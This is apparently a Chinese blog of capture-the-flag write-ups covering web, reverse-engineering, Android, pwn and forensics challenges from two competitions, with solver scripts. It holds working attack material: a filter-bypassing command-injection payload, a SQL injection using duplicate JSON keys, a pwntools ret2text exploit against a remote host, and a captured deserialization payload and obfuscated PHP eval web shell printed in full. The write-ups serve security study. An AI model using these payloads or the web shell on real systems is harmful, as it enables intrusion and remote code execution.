ZmxhZ3thNTNlMTgzOC01OTczLTRlY2MtOWFjMC00ODZlOTA0NThhMTl9Cg==，base64解码得flag。 ​ Web-sign in提示robots协议，访问 robots.txt，发现存在 fiag_ls_h3re.php， 访问发现右键被禁用，加前缀 view-source: 查看源码得flag。 ​ EXEC 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);if(isset($_REQUEST[&quot;cmd&quot;]))&#123; $shell = $_REQUEST[&quot;cmd&quot;]; $shell = str_ireplace(&quot; &quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;\\n&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;\\t&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;?&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;*&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;&lt;&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;system&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;passthru&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;ob_start&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;getenv&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;putenv&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;mail&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;error_log&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;`&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;exec&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;shell_exec&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;echo&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;cat&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;ls&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;nl&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;tac&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;bash&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;sh&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;tcp&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;base64&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;flag&quot;,&quot;&quot;,$shell); $shell = str_ireplace(&quot;cp&quot;,&quot;&quot;,$shell); exec($shell);&#125;else&#123; highlight_file(__FILE__);&#125; 带黑名单的无回显RCE，可以重定向写命令执行结果到文件，关键字可双写绕过，空格用$IFS绕过。 列目录：?cmd=llss$IFS/&gt;1.txt，得到根目录flag文件名 ctf_is_fun_flag2021； 读文件：?cmd=uniq$IFS/ctf_is_fun_flflagag2021&gt;1.txt，得到flag。 ​ Language源码里有python和go两个文件夹，有两个服务，端口8000是python开的，映射到对外端口；内网端口5000是go服务。python代码相当于中转站接受外网请求，处理后转发给go，go进行底层处理。 go服务中关键代码 backend.go： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package controllerimport ( db &quot;ctf/database&quot; &quot;encoding/json&quot; &quot;fmt&quot; &quot;github.com/buger/jsonparser&quot; &quot;io/ioutil&quot; &quot;net/http&quot;)type Language struct &#123; Id int32 `json:&quot;id&quot;` Name string `json:&quot;name&quot;` Votes int64 `json:&quot;votes&quot;`&#125;func Index(w http.ResponseWriter, _ *http.Request) &#123; ok(w, &quot;Hello World!&quot;)&#125;func List(w http.ResponseWriter, _ *http.Request) &#123; rows, err := db.Sqlite.Query(&quot;SELECT * FROM languages;&quot;) if err != nil &#123; fail(w, &quot;Something wrong&quot;) fmt.Println(err.Error()) return &#125; defer rows.Close() res := make([]Language, 0) for rows.Next() &#123; var pl Language _ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes) res = append(res, pl) &#125; err = json.NewEncoder(w).Encode(res)&#125;func Search(w http.ResponseWriter, r *http.Request) &#123; reqBody, _ := ioutil.ReadAll(r.Body) votes, err := jsonparser.GetInt(reqBody, &quot;votes&quot;) if err != nil &#123; fail(w, &quot;Error reading votes&quot;) return &#125; name, err := jsonparser.GetString(reqBody, &quot;name&quot;) if err != nil &#123; fail(w, &quot;Error reading name&quot;) return &#125; query := fmt.Sprintf(&quot;SELECT * FROM languages WHERE votes &gt;= %d OR name LIKE &#x27;%s&#x27;;&quot;, votes, name) rows, err := db.Sqlite.Query(query) if err != nil &#123; fail(w, &quot;Something wrong&quot;) fmt.Println(err.Error()) return &#125; res := make([]Language, 0) for rows.Next() &#123; var pl Language _ = rows.Scan(&amp;pl.Id, &amp;pl.Name, &amp;pl.Votes) res = append(res, pl) &#125; err = json.NewEncoder(w).Encode(res)&#125;func Flag(w http.ResponseWriter, r *http.Request ) &#123; action:= r.URL.Query().Get(&quot;action&quot;) if action == &quot;&quot; &#123; fail(w, &quot;Error getting action&quot;) return &#125; token:= r.URL.Query().Get(&quot;token&quot;) if token == &quot;&quot; &#123; fail(w, &quot;Error getting token&quot;) return &#125; var secret string row := db.Sqlite.QueryRow(&quot;SELECT secret FROM token;&quot;) if err := row.Scan(&amp;secret); err != nil &#123; fail(w, &quot;Error querying secret token&quot;) return &#125; if action == &quot;readFlag&quot; &amp;&amp; secret == token &#123; data, err := ioutil.ReadFile(&quot;flag&quot;) if err != nil &#123; fail(w, &quot;Error reading flag&quot;) return &#125; ok(w, fmt.Sprintf(&quot;Congrats this is your flag: %s&quot;, string(data))) return &#125; ok(w, &quot;Wrong token&quot;)&#125; 路由 /flag 中GET两个参数 ?action=readFlag&amp;token=xxxxx，token正确得flag，而路由 /search 中容易通过SQL注入拿到token。 python服务中 app.py： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from flask import Flask, request, render_template, jsonifyfrom urllib.parse import unquoteimport requestsapp = Flask(__name__)server = &#x27;127.0.0.1:8000&#x27;@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/list&quot;, methods=[&quot;POST&quot;])def listAll(): r = requests.post(f&quot;http://&#123;server&#125;/api/list&quot;) return jsonify(r.json())@app.route(&quot;/search&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def search(): if request.method == &quot;GET&quot;: return render_template(&quot;search.html&quot;) else: data = request.json if data[&#x27;name&#x27;]: if not isinstance(data[&#x27;name&#x27;], str) or not data[&#x27;name&#x27;].isalnum(): return jsonify(&#123;&quot;error&quot;: &quot;Bad word detected&quot;&#125;) if data[&#x27;votes&#x27;]: if not isinstance(data[&#x27;votes&#x27;], int): return jsonify(&#123;&quot;error&quot;: &quot;Bad word detected&quot;&#125;) r = requests.post(f&quot;http://&#123;server&#125;/api/search&quot;, data=request.data) return jsonify(r.json())@app.route(&quot;/healthcheck&quot;, methods=[&quot;GET&quot;])def healthCheck(): getPath = [&quot;&quot;, &quot;flag&quot;] postPath = [&quot;api/list&quot;, &quot;api/search&quot;] try: for path in getPath: requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) for path in postPath: requests.post(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) except: return &quot;Down&quot; return &quot;OK&quot;@app.route(&quot;/&lt;path:path&gt;&quot;, methods=[&quot;GET&quot;])def handle(path): if &#x27;flag&#x27; in unquote(path): action = request.args.get(&#x27;action&#x27;) token = request.args.get(&#x27;token&#x27;) print(action) if action == &quot;readFlag&quot;: return jsonify(&#123;&quot;error&quot;: &quot;Sorry, readFlag is not permitted&quot;&#125;) r = requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;, params=&#123; &quot;action&quot;: action, &quot;token&quot;: token &#125;) else: r = requests.get(f&quot;http://&#123;server&#125;/&#123;path&#125;&quot;) return jsonify(r.text)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=5000) 发现其中存在两个点需要绕过： 路由 /search 中JSON严格过滤，name 的值必须满足 isalnum()，votes 的值必须为数字，避免SQL注入情况； 检测url里使用GET方法传入 action=readFlag 会直接拒绝。 对于第1点，尝试构造含两个 name 参数的JSON，在python中认JSON中第二个 name，而go中认JSON中第一个 name，利用这种差异构造：&#123;&quot;votes&quot;:1,&quot;name&quot;:&quot;-1&#39; union select 1,secret,3 from token --+&quot;,&quot;name&quot;:[]&#125;，绕过得到token值，得到 re@l1y_4th_T0k3n。 对于第2点，利用 @app.route(&quot;/&lt;path:path&gt;&quot;) 特性，对 ? 进行url编码可以在python层面绕过GET参数识别，即 action = request.args.get(&#39;action&#39;) 不会获取到内容，payload：/flag%3faction=readFlag&amp;token=re@l1y_4th_T0k3n。 得到flag：&quot;&#123;\\&quot;msg\\&quot;:\\&quot;Congrats this is your flag: flag&#123;73c468d2-582e-4fdf-8be9-72efe6cbb9a2&#125;\\\\n\\&quot;&#125;\\n&quot; ​ REVERSEhiahia o(*^▽^*)┛IDA查看伪码，无逆向，照着实现就行： 123456789101112131415161718s=list(b&#x27;igdb~Mumu@p&amp;&gt;%;%&lt;$&lt;p&#x27;)def flag(c,k): if k&gt;9: if k&amp;1==0: return c-11 else: return c+13 else: if k&amp;1==0: return c-3 else: return c+5t=&#x27;&#x27;for i in range(len(s)): t+=chr(flag(s[i],i))print(t)# flag&#123;RrrrEe33202111&#125; ​ ANDROIDjadx查看MainActivity主逻辑： 12345678910111213141516171819202122232425public void onClick(View view) &#123; String trim = this.input.getText().toString().trim(); int[] iArr = &#123;102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42&#125;; int[] iArr2 = &#123;42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42, 42&#125;; if (trim.length() != 18) &#123; this.input.setText(&quot;FLAG错误&quot;); return; &#125; char[] charArray = trim.toCharArray(); for (int i = 0; i &lt; 17; i++) &#123; iArr2[i] = i % 2 == 0 ? charArray[i] ^ i : charArray[i] ^ charArray[i + 1]; &#125; String str = &quot;&quot;; for (int i2 = 0; i2 &lt; 18; i2++) &#123; str = str.concat(Integer.toHexString(iArr2[i2])).concat(&quot;,&quot;); &#125; System.out.println(str); for (int i3 = 0; i3 &lt; 18; i3++) &#123; if (iArr2[i3] != iArr[i3]) &#123; this.input.setText(&quot;FLAG错误！&quot;); return; &#125; &#125; this.input.setText(&quot;FLAG正确&quot;);&#125; 用z3解： 12345678910111213141516171819202122232425from z3 import *flag=[BitVec(f&#x27;flag&#123;i&#125;&#x27;,7) for i in range(18)]out=[102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42]s=[42]*19ss=Solver()for i in range(17): if i%2==0: s[i]=flag[i]^i else: s[i]=flag[i]^flag[i+1]for i in range(18): ss.add(s[i]==out[i])ss.check()m=ss.model()res=&#x27;&#x27;for i in range(17): res+=(chr(m[flag[i]].as_long()))print(res)# flag&#123;Reverse__APP 加花括号闭合，得到flag：flag{Reverse__APP} ​ WAY flag{md5(result)} 检测带upx壳，脱壳后IDA查看伪码，迷宫题，wsad代表上下左右，提取迷宫数组得： 12345OIIIIOOIO#IOOOIIOIOIIIIII 容易得到路径：sdsddwd，MD5得到flag：flag{6654b3343f6f3f6223a721e7f65e87f8} ​ SPARKSparc架构，IDA无法反编译为伪码，用Ghidra得到伪码主逻辑： 123456789101112131415161718192021222324252627282930313233343536373839undefined8 main(void)&#123; longlong unaff_g7; int local_res7d3; undefined8 local_res7d7; undefined8 local_res7df; undefined8 local_res7e7; undefined8 local_res7ef; longlong local_res7f7; local_res7f7 = *(longlong *)(unaff_g7 + 0x28); local_res7d7 = 0; local_res7df = 0; local_res7e7 = 0x37463f3044413243; local_res7ef = 0x3429000000000000; puts(&quot;input_sparkle_flag_here:\\n&quot;); read(0,&amp;local_res7d7,0xc); local_res7d3 = 0; do &#123; if (9 &lt; local_res7d3) &#123; puts(&quot;good_job!&quot;);LAB_001008a0: if (local_res7f7 == *(longlong *)(unaff_g7 + 0x28)) &#123; return 0; &#125; /* WARNING: Subroutine does not return */ __stack_chk_fail(); &#125; *(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) = *(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) + -0x2f; if (*(char *)((longlong)&amp;local_res7d7 + (longlong)local_res7d3) != *(char *)((longlong)&amp;local_res7e7 + (longlong)local_res7d3)) &#123; puts(&quot;incorrect\\n&quot;); goto LAB_001008a0; &#125; local_res7d3 = local_res7d3 + 1; &#125; while( true );&#125; 逻辑为输入flag值逐字符 -0x2f 得到的字符串与 0x37463f30444132433429 相等，即ROT47。 简单还原得flag：flag{fun_sparcX} ​ PWNEz_pwn简单ret2text： 123456from pwn import *r = remote(&#x27;hsc2019.site&#x27;,10891)r.recvline()pl = &#x27;a&#x27;*0x48 + p64(0x400741)r.sendline(pl)r.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"长安“战疫”网络安全卫士守护赛","slug":"match-长安“战疫”网络安全卫士守护赛","date":"2022-01-08T10:00:01.000Z","updated":"2022-01-08T12:51:09.214Z","comments":true,"path":"2022/01/08/match-长安“战疫”网络安全卫士守护赛/","link":"","permalink":"https://lazzzaro.github.io/2022/01/08/match-%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/","excerpt":"","text":"​ 新冠疫情肆虐全球，这一场疫情阻击战不仅是我国卫生健康领域的一场战疫，也是科学技术领域的一次大考。在这个特殊时期，保障网络安全，防范利用新冠肺炎疫情实施的网络攻击行为是关系广大人民群众切身利益的大事。如网络攻击者将计算机病毒、木马和移动恶意程序等伪装成“肺炎病例”“防护通知”等信息，通过钓鱼邮件、恶意链接等方式进行传播，造成用户安全问题。 西安数所高校学生团体联合发起长安战疫网络安全公益科普赛和长安战疫“网络安全卫士”守护赛，一方面提升全民疫情期间的网络安全意识与疫情中常见问题的应对措施，另一方面提升我省的网络安全应急响应能力和网络安全从业者技术能力，协助用户提升网络安全防护能力，为战胜新冠肺炎提供网络空间保障。 Rank: 14 MISC八卦迷宫 一起走迷宫吧，要提交全拼音字符奥 走迷宫，串联经过的八卦对应文字：cazy&#123;战长恙长战恙河长山山安战疫疫战疫安疫长安恙&#125;，转为全拼： cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125; ​ 朴实无华的取证xp内存取证，先判断profile volatility -f xp_sp3.raw imageinfo 查看进程 volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist 发现notepad和mspaint，查看记事本 volatility -f xp_sp3.raw --profile=WinXPSP2x86 notepad 找到信息： 20211209(Encrypt)。 再查看桌面文件 volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep -E &quot;桌面&quot; 找到文件 flag.zip 和 flag.png，分别dump下来 flag.png 中有密文信息： FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]， flag.zip 有密码，用前面的 20211209 解开找到加密算法： 1234567891011121314151617void Encrypt(string&amp; str)&#123; for(int i = 0; i &lt; str.length(); i++) &#123; if(str[i] &gt;=&#x27;a&#x27;&amp;&amp; str[i]&lt;=&#x27;w&#x27;) str[i]+=3; else if(str[i]==&#x27;x&#x27;) str[i]=&#x27;a&#x27;; else if(str[i]==&#x27;y&#x27;) str[i]=&#x27;b&#x27;; else if(str[i]==&#x27;z&#x27;) str[i]=&#x27;c&#x27;; else if(str[i]==&#x27;_&#x27;) str[i]=&#x27;|&#x27;; str[i] -= 32; &#125;&#125; 还原flag： 123456789101112131415161718192021222324252627s = list(b&#x27;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]&#x27;)t = &#x27;&#x27;def encrypt(x): if x &gt;= ord(&#x27;a&#x27;) and x &lt;= ord(&#x27;w&#x27;): x += 3 elif x == ord(&#x27;x&#x27;): x = ord(&#x27;a&#x27;) elif x == ord(&#x27;y&#x27;): x = ord(&#x27;b&#x27;) elif x == ord(&#x27;z&#x27;): x = ord(&#x27;c&#x27;) elif x == ord(&#x27;_&#x27;): x = ord(&#x27;|&#x27;) x -= 32 return xfor i in range(len(s)): for j in range(128): if encrypt(j) == s[i]: t += chr(j) break else: t += &#x27;?&#x27;print(t)# cazy&#123;Xian?will?certainly?succeed?in?fighting?the?epidemic&#125; ? 改 _ ，得到flag：cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125; ​ 无字天书在流量包中发现 secret 流量，dump得到gzip包，内容为一串16进制字符串，其中包含 504B0304，转存为zip文件，内含 flag.txt 和 key.ws 两个纯空白字符文件。 key.ws 中包含空格与tab字符及大量换行符，为whitespace语言，在线运行得到输出 XiAnWillBeSafe； flag.txt 中包含大量空格与tab字符，为snow隐写，密码 XiAnWillBeSafe，解密： SNOW.EXE -C -p XiAnWillBeSafe flag.txt，得到flag： cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125; ​ 西安加油在流量包中发现 secret.txt 流量，dump下来base64解码得到zip文件： 1234import base64f = open(&#x27;secret.txt&#x27;,&#x27;rb&#x27;).read()open(&#x27;out.zip&#x27;,&#x27;wb&#x27;).write(base64.b64decode(f)) 打开为拼图，共48张，选择带flag的部分图片纯手拼： flag：cazy&#123;make_XiAN_great_Again&#125; ​ ez_Encrypt查看流量，发现是蚁剑流量，其中一个流中 TzozOToiTGVhZ3VlXEZseXN5c3RlbVxDYWNoZWRcU3RvcmFnZVxBZGFwdGVyIjo1OntzOjc6IgAqAGZpbGUiO3M6MTE6Ii4vc2hlbGwucGhwIjtzOjEwOiIAKgBhZGFwdGVyIjtPOjMwOiJMZWFndWVcRmx5c3lzdGVtXEFkYXB0ZXJcTG9jYWwiOjE6e3M6MTM6IgAqAHdyaXRlRmxhZ3MiO2k6MDt9czo5OiIAKgBleHBpcmUiO047czoxMToiACoAYXV0b3NhdmUiO2I6MDtzOjg6IgAqAGNhY2hlIjthOjE6e2k6MDtzOjI5OiI8P3BocCBldmFsKCRfUE9TVFsnY2F6eSddKSA%2FPiI7fX0%3D base64解码为 O:39:&quot;League\\Flysystem\\Cached\\Storage\\Adapter&quot;:5:&#123;s:7:&quot;.*.file&quot;;s:11:&quot;./shell.php&quot;;s:10:&quot;.*.adapter&quot;;O:30:&quot;League\\Flysystem\\Adapter\\Local&quot;:1:&#123;s:13:&quot;.*.writeFlags&quot;;i:0;&#125;s:9:&quot;.*.expire&quot;;N;s:11:&quot;.*.autosave&quot;;b:0;s:8:&quot;.*.cache&quot;;a:1:&#123;i:0;s:29:&quot;&lt;?php eval($_POST[&#39;cazy&#39;]) ?&gt;&quot;;&#125;&#125;， 说明通过反序列化漏洞写入一句话木马。 找到一长串base64编码字符串，解码保存为 www.zip 源码，在 app\\controller\\Index.php 中找到混淆处理过的马： 1&lt;?php define(&#x27;IKlSux1227&#x27;,__FILE__);$DusPFr=base64_decode(&quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==&quot;);$arCiCL=$DusPFr[3].$DusPFr[6].$DusPFr[33].$DusPFr[30];$VvUrBZ=$DusPFr[33].$DusPFr[10].$DusPFr[24].$DusPFr[10].$DusPFr[24];$DEomKk=$VvUrBZ[0].$DusPFr[18].$DusPFr[3].$VvUrBZ[0].$VvUrBZ[1].$DusPFr[24];$LnpnvY=$DusPFr[7].$DusPFr[13];$arCiCL.=$DusPFr[22].$DusPFr[36].$DusPFr[29].$DusPFr[26].$DusPFr[30].$DusPFr[32].$DusPFr[35].$DusPFr[26].$DusPFr[30];eval($arCiCL(&quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;));?&gt; 尝试手动逐层解密，最后得到： 1234567891011121314151617181920&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController&#123; public function index() &#123; if(!empty($_GET[&#x27;pop&#x27;]))&#123; unserialize(base64_decode($_GET[&#x27;pop&#x27;])); &#125; return &quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;; &#125; public function C4zyC0m3On() &#123; return &#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;; &#125;&#125; ​ Ez_Stegzip压缩包根据提示爆破6位数字密码为 220101，解压有 steg.pyc 和 flag.txt。 用uncompyle6逆pyc发现无有意义代码，为pyc隐写，用stegosaurus工具解密： python stegosaurus.py 